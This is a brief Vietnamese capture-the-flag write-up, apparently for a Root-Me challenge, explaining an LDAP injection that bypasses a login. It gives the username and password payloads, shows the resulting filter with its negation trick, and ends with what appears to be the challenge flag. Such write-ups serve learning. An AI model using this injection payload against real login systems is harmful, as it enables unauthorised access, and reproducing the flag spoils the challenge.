![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/956f1a0a-4a8b-4622-8831-9072a84757f2)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/75ddcc7f-8ab6-4eb4-8529-e70cebf13f78)

=> báo lỗi nhưng ta thấy được cấu trúc của LDAP

sử dụng payload ```*)(!(&(1=0 ``` làm username và ```foobar))``` làm password

khi đó câu lệnh sẽ trở thành 
```
(&(uid=*)(!(&(1=0)(userPassword=foobar)))
```

userPasssword sẽ trả về là false =)) vì sai rõ, vì thế ta thêm (1=0) để cho 2 câu truy vấn bên trong 
toán tử '&' nó sai, sau đó dùng '!' (phủ định) để lộn ngược false thành true 

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/374923ea-fef7-451e-9494-4086c40fef19)

![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/740305de-321c-480f-bde4-8e14355ad155)

=> SWRwehpkTI3Vu2F9DoTJJ0LBO
